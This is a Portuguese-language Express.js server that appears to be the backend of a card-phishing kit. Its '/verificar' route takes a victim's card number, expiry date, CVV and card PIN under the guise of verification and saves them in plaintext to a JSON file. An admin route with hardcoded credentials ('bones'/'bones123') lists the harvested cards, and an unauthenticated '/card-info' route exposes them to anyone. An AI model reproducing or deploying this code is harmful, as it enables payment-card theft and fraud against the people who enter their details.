const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const port = process.env.PORT || 5000

app.use(express.static(path.join(__dirname, 'public')));
app.use(express.urlencoded({ extended: true }));
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.get('/', (req, res) => {
  res.render('index');
});

app.get('/card-info', (req, res) => {
  const cardsPath = path.join(__dirname, 'data', 'cards.json');
  const cardsData = JSON.parse(fs.readFileSync(cardsPath, 'utf8'));
  res.render('card-info', { cards: cardsData });
});

app.post('/verificar', (req, res) => {
    let { nomeCartao, numeroCartao, dataExpiracao, cvv, senhaCartao } = req.body;

  numeroCartao = numeroCartao.replace(/\s+/g, '');

  dataExpiracao = dataExpiracao.replace(/\//g, '|');

  const newCard = {
    id: Date.now(),
    nomeCartao,
    numeroCartao,
    dataExpiracao,
    cvv,
    senhaCartao,
  };

  const cardsPath = path.join(__dirname, 'data', 'cards.json');
  const cardsData = JSON.parse(fs.readFileSync(cardsPath, 'utf8'));
  cardsData.push(newCard);
  fs.writeFileSync(cardsPath, JSON.stringify(cardsData, null, 2));

  res.render('verificacao');
});

app.get('/admin', (req, res) => {
    res.render('admin');
  });
  
  app.post('/admin', (req, res) => {
    const { usuario, senha } = req.body;
    if (usuario === 'bones' && senha === 'bones123') {
      const cardsPath = path.join(__dirname, 'data', 'cards.json');
      const cardsData = JSON.parse(fs.readFileSync(cardsPath, 'utf8'));
      res.render('card-info', { cards: cardsData });
    } else {
      res.send('Credenciais inválidas');
    }
  });

app.listen(port, () => {
  console.log(`Servidor rodando em http://localhost:${port}`);
});
